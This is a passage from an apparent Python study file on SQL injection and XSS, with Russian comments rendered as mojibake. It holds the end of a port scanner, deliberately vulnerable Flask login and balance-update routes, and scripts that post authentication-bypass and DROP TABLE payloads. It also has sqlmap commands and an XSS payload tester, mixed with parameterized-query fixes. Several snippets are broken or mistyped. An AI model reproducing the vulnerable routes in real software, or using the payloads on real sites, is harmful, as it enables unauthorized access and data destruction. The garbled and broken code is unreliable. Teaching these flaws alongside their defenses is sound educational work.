                vulns.append("Potential IIS vulnerabilities")
        
        return vulns

    def save_results(self, filename = None):
        """Save scan results to JSON file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"scan_results_{self.target}_{timestamp}.json"
        
        results = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'open_ports': self.results,
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent = 4)
        
        print(f"\n[+] Results saved to {filename}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Advanced Port Scanner with Vulnerability Detection')
    parser.add_argument('target', help = 'Target IP address or hostname')
    parser.add_argument('-p', '--ports', help = 'Specific ports to scan (comma-separated)')
    parser.add_argument('-t', '--threads', type = int, default = 100, help = 'Number of threads to use')
    parser.add_argument('-o', '--output', help = 'Output file name')
    
    args = parser.parse_args()
    
    # Process ports argument
    ports = None
    if args.ports:
        ports = [int(p) for p in args.ports.split(',')]
    
    scanner = PortScanner(args.target, ports, args.threads)
    scanner.run_scan()
    
    if args.output or (scanner.results and scanner.vulnerabilities):
        scanner.save_results(args.output)

# ======================================== –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ SQL-–∏–Ω—ä–µ–∫—Ü–∏–π –¥–ª—è –∞—Ç–∞–∫ ===================================================
# –ü—Ä–∏–º–µ—Ä—ã SQL-–∏–Ω—ä–µ–∫—Ü–∏–π
# SQL-–∏–Ω—ä–µ–∫—Ü–∏—è –≤ –∑–∞–ø—Ä–æ—Å SELECT
# SELECT * FROM users WHERE username = 'admin' AND password = 'password';

# –ï—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–≤–µ–¥–µ—Ç –≤ –ø–æ–ª–µ userna—àe –∑–Ω–∞—á–µ–Ω–∏–µ adniin' --, –∑–∞–ø—Ä–æ—Å —Å—Ç–∞–Ω–µ—Ç:
# SELECT * FROM users WHERE username = 'admin' --' AND password = lpassword';

# SQL-–∏–Ω—ä–µ–∫—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ª–æ–≥–∏—á–µ—Å–∫–æ–≥–æ –≤—ã—Ä–∞–∂–µ–Ω–∏—è
# SELECT * FROM users WHERE username = 'admi_n' AND password = 'password';

# –ï—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–≤–µ–¥–µ—Ç –≤ –ø–æ–ª–µ –Ωse–≥name –∑–Ω–∞—á–µ–Ω–∏–µ –∞d—ài–Ω' OR '1'=' 1, –∑–∞–ø—Ä–æ—Å —Å—Ç–∞–Ω–µ—Ç:
# SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND passord = 'password';

# –ü–æ—Å–∫–æ–ª—å–∫—É –≤—ã—Ä–∞–∂–µ–Ω–∏–µ '1'='1' –≤—Å–µ–≥–¥–∞ –∏—Å—Ç–∏–Ω–Ω–æ, –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–ª—É—á–∏—Ç –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω—ã–º.

# FLASK
from flask import Flask, request, g
import sqlite3

app = Flask(__name__)
DATABASE = 'test.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/ login', methods = [ 'GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # –£—è–∑–≤–∏–º—ã–π SQL-–∑a–øpoc
        query = f"SELECT * FROM users WHERE username'{username}' AND password = '{password}'"
        print(query)
        cur = get_db().execute(query)
        user = cur.fetchone()
        if user:
            return f"Welcome, {username}!"
        else:
            return "Invalid credentials!"
    return '''
        <form method="post">
            Username: <input type="text" name="useiname"><br>
            Password: <input type="password"
            name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''
if __name__== '__main__':
    app.run(debug = True)

# –ó–∞—â–∏—Ç–∞ –æ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏–π
# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤.
@app.route('/login', methods = ['GET', 'POST'])
def login() :
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        # –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π SQL-–∑a–øpoc
        query = "SELECT * FROM users WHERE username = ? AND password = ?"
        cur = get_db() .execute(query, (username, password))
        user = cur.fetchone()
        if user:
            return f"Welcome, { username} ! "
        else:
            return "Invalid credentials!"
    return '''
        <form method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password"
            name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''

# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ûR–ú (Object-Relational Mapping).
from flask import Flask, request
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE URI'] = 'sqlite:///test.db'
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key = True)
    username = db.Column(db.String(80), unique = True, nullable = False)
    password = db.Column(db.String(120), nullabe = False)


@app.route('/login', methods = [ 'GET', 'POST' ] )
def login():
    if request.method == 'POST':
        username = request.form['username' ]
        password = request.form['password']
        
        # –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∑–∞–ø—Ä–æ—Å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ûR–ú
        user = User.query.filter_by(username = username,
        password = password).first()
        if user:
            return f"Welcome, {username} ! "
        else:
            return "Invalid credentials!"
    return '''
        <form method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''
if __name__== '__main__':
    app.run(debug = True)

# –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è –∏ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞.
username = input("–í–≤–µ–¥–∏—Ç–µ –∏ –º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ")
# SQL-–∑a–øpoc –±–µ–∑ –∑–∞—â–∏—Ç—ã –æ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏
sql_query = "SELECT * FROM users WHERE username = ' {} '".format(username)

# –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–¥–µ—Ç –≤ –ø–æ–ª–µ –≤–≤–æ–¥–∞ —Å–ª–µ–¥—É—é—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ: 'OR '1'='1, —Ç–æ –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω—ã–π SQL-–∑a–øpoc –±—É–¥–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å —Ç–∞–∫:
# SELECT * FROM users WHERE username = '' OR '1'='1'

# SQL-–∑a–øpoc –±–µ–∑ –∑–∞—â–∏—Ç—ã –æ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏
sql_query = "SELECT * FROM users WHERE username = ' {} '".format(username)

# –ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è SQL-–∏–Ω—ä–µ–∫—Ü–∏–π –Ω–∞ Python –≤ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏
import sqlite3

# –ü–æ–ª—É—á–∞–µ–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –≤–≤–æ–¥–∞
username = input("–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ")

# SQL-–∑a–øpoc –±–µ–∑ –∑–∞—â–∏—Ç—ã –æ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏
sql_query = "SELECT * FROM users WHERE username = ' {} '".format(username)

# –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö SQLite
conn = sqlite3.connect('database.db')
cursor = conn.cursor()

# –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑a–øpoca
cursor.execute(sql_query)

# –ü–æ–ª—É—á–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –∑–∞–ø—Ä–æ—Å–∞
results = cursor.fetchall()

# –í—ã–≤–æ–¥ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
for row in results:
    print(row)

# –ó–∞–∫—Ä—ã—Ç–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
conn.close()

# –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–¥–µ—Ç –≤ –ø–æ–ª–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å–ª–µ–¥—É—é—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ: 'OR '1'='1, —Ç–æ SQL-–∑a–øpoc –±—É–¥–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:
# SELECT * FROM users WHERE username = '' OR '1'='1'

# –ø—Ä–∏–º–µ—Ä, –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É—é—â–∏–π, –∫–∞–∫ SQL-–∏–Ω—ä–µ–∫—Ü–∏—è –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –¥–ª—è –∞—Ç–∞–∫–∏ –Ω–∞ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ Python —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Flask –∏ SQLite
from flask import Flask, request, render_template
import sqlite3
app = Flask(__name__)

# –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö SQLite
conn = sqlite3.connect('users.db')
cursor = conn.cursor()

# –°–æ–∑–¥–∞–Ω–∏–µ —Ç–∞–±–ª–∏—Ü—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π (–¥–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã)
cursor.execute('''CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL
)''')
conn.commit()

# –†–æ—É—Ç –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
@app.route('/register', methods = ['POST'])
def register():
    request.form['username']
    username
    password = request.form['password']

    # –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ SQL-–∑a–øpoca
    sql_query = "INSERT INTO users (username, password) VALUES('{}', '{}') ".format(username, password)

    # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑a–øpoca
    cursor.execute(sql_query)
    conn.commit()
    return "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É—Å–ø–µ—à–Ω–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω!"

# –†–æ—É—Ç –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
@app.route('/login', methods =['POST'])
def login():
    username = request.form['username']
    password = request.form ['password']
    # –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ SQL-–∑a–øpoca
    sql_query = "SELECT * FROM users WHERE username = '{}' AND password = '{}'".format(username, password)

    # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑a–øpoca
    cursor.execute(sql_query)
    user = cursor.fetchone()
    if user:
        return "–í—ã —É—Å–ø–µ—à–Ω–æ –≤–æ—à–ª–∏ –≤ —Å–∏—Å—Ç–µ–º—É!"
    else:
        return "–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å!"
    
if __name__=='__main__':
    app.run(debug = True)

# –ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–≤–æ–¥–∏—Ç —Å–ª–µ–¥—É—é—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –≤ –ø–æ–ª–µ "usemame" –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É: admin' --
# –≠—Ç–æ—Ç –≤–≤–æ–¥ –∏–∑–º–µ–Ω–∏—Ç –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω—ã–π SQL-–∑a–øpoc –≤ —Ä–∞—É—Ç–µ /login —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:
# SELECT * FROM users WHERE username = 'admin' --' AND password = 'password'

# –ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è SQL-–∏–Ω—ä–µ–∫—Ü–∏–π –¥–ª—è –∞—Ç–∞–∫
# –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
import requests

# –ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ —É –Ω–∞—Å –µ—Å—Ç—å URL –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
url = 'https://www.example.com/login'

# Payload –¥–ª—è –∞—Ç–∞–∫–∏ SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏
payload = "' OR '1' ='1"

# –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å —Å –≤–Ω–µ–¥—Ä–µ–Ω–Ω—ã–º payload'o–º
response = requests.post(url, data = {'username': payload, 'password': payload})

# –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –æ—Ç–≤–µ—Ç –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ —É—Å–ø–µ—à–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
if '–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ' in response.text:
    print('Y–¥a–ªoc—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤—Ö–æ–¥ –≤ —Å–∏—Å—Ç–µ–º—É —Å –ø–æ–º–æ—â—å—é SQL¬≠-–∏–Ω—ä–µ–∫—Ü–∏–∏ ! ')

# –£–¥–∞–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
import requests

# URL –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∏–∑ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
url = 'https://www.example.com/delete_user'

# Payload –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –≤—Å–µ—Ö –∑–∞–ø–∏—Å–µ–π –∏–∑ —Ç–∞–±–ª–∏—Ü—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
payload = "'; DROP TABLE users; --"

# –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å —Å –≤–Ω–µ–¥—Ä–µ–Ω–Ω—ã–º payload'o–º
response = requests.get(url + '?id=' + payload)

# –ü—Ä–æ–≤–µ—Ä—è–µ–º, –±—ã–ª–∏ –ª–∏ –¥–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã
if response.status_code == 200:
    print('–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã –∏–∑ —Ç–∞–±–ª–∏—Ü—ã users! ')

# =================================================================================================================================
# –ü—Ä–∏–º–µ—Ä –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –∫–æ–¥–∞ –Ω–∞ Python —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
import sqlite3

def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∑–∞–ø—Ä–æ—Å —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    
    conn.close()
    return user

# ================================================================================================================================

# –ü—Ä–∏–º–µ—Ä —É—è–∑–≤–∏–º–æ–≥–æ Flask-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è (–ù–ï –ò–°–ü–û–õ–¨–ó–û–í–ê–¢–¨ –í PRODUCTION!)
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/update_balance', methods = ['GET'])
def update_balance():
    user_id = request.args.get('user_id')
    new_balance = request.args.get('balance')
    
    conn = sqlite3.connect('test.db')
    cursor = conn.cursor()
    
    # –£—è–∑–≤–∏–º—ã–π SQL-–∑–∞–ø—Ä–æ—Å (–ø–æ–¥–≤–µ—Ä–∂–µ–Ω –∏–Ω—ä–µ–∫—Ü–∏–∏)
    query = f"UPDATE users SET balance = {new_balance} WHERE id = {user_id}"
    cursor.execute(query)
    conn.commit()
    conn.close()
    
    return "–ë–∞–ª–∞–Ω—Å –æ–±–Ω–æ–≤–ª–µ–Ω!"

if __name__ == '__main__':
    app.run(debug = True)

# –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã
# –ë–µ–∑–æ–ø–∞—Å–Ω–∞—è –≤–µ—Ä—Å–∏—è (–Ω–∞ Python + SQLite)
query = "UPDATE users SET balance = ? WHERE id = ?"
cursor.execute(query, (new_balance, user_id))

# ORM (–Ω–∞–ø—Ä–∏–º–µ—Ä, SQLAlchemy)
from sqlalchemy import create_engine, Table, MetaData

engine = create_engine('sqlite:///test.db')
metadata = MetaData()
users = Table('users', metadata, autoload_with = engine)

# –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
stmt = users.update().where(users.c.id == user_id).values(balance = new_balance)
engine.execute(stmt) 

# SQLMap (–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ SQL-–∏–Ω—ä–µ–∫—Ü–∏–π)
# sqlmap -u "http://example.com/update_balance?user_id=1&balance=100" --data="user_id=1&balance=100" --risk=3 --level=5

# ======================================================================================================================================

# –ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è –æ—Ç —Ç–∞–∫–∏—Ö –∞—Ç–∞–∫?
# –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∫–æ–¥ (Python + SQLite)
import sqlite3

def delete_user(user_id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # –ü–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –∑–∞–ø—Ä–æ—Å (–∑–∞—â–∏—Ç–∞ –æ—Ç –∏–Ω—ä–µ–∫—Ü–∏–π)
    cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()

# SQLMap (—Ç–æ–ª—å–∫–æ —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –≤–ª–∞–¥–µ–ª—å—Ü–∞): sqlmap -u "http://example.com/delete?id=1" --method=GET --risk=3 --level=5

# ====================================================================================================================================

# –¢–µ—Å—Ç–æ–≤—ã–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ (—Ç–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π)
import requests

def test_xss_injection(target_url, param, test_string):
    """
    –ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –≤–Ω–µ–¥—Ä–µ–Ω–∏—è XSS —á–µ—Ä–µ–∑ SQL-–∏–Ω—ä–µ–∫—Ü–∏—é
    """
    payloads = [
        "'\"><script>alert('XSS')</script>",
        "' OR 1=1; UPDATE pages SET content='<script>alert(1)</script>' WHERE id=1;--"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(
                f"{target_url}?{param}={payload}",
                timeout=5
            )
            
            if payload.lower() in response.text.lower():
                print(f"[!] –í–æ–∑–º–æ–∂–Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å —Å payload: {payload[:50]}...")
                print(f"    URL: {response.url}")
        except Exception as e:
            print(f"[–û—à–∏–±–∫–∞] {e}")

# –ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è (—Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–æ–≤—ã—Ö —Å–∞–π—Ç–æ–≤ —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è)
test_xss_injection(
    "http://test-site.example.com/page",
    "id",
    "xss_test"
)

# –ó–∞—â–∏—Ç–∞ –æ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏–π:
# –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã
cursor.execute("SELECT * FROM pages WHERE id = %s", (page_id,))

# –ó–∞—â–∏—Ç–∞ –æ—Ç XSS:
# –≠–∫—Ä–∞–Ω–∏—Ä—É–π—Ç–µ –≤—ã–≤–æ–¥ –≤ HTML (Python –ø—Ä–∏–º–µ—Ä)
from html import escape
safe_content = escape(user_content)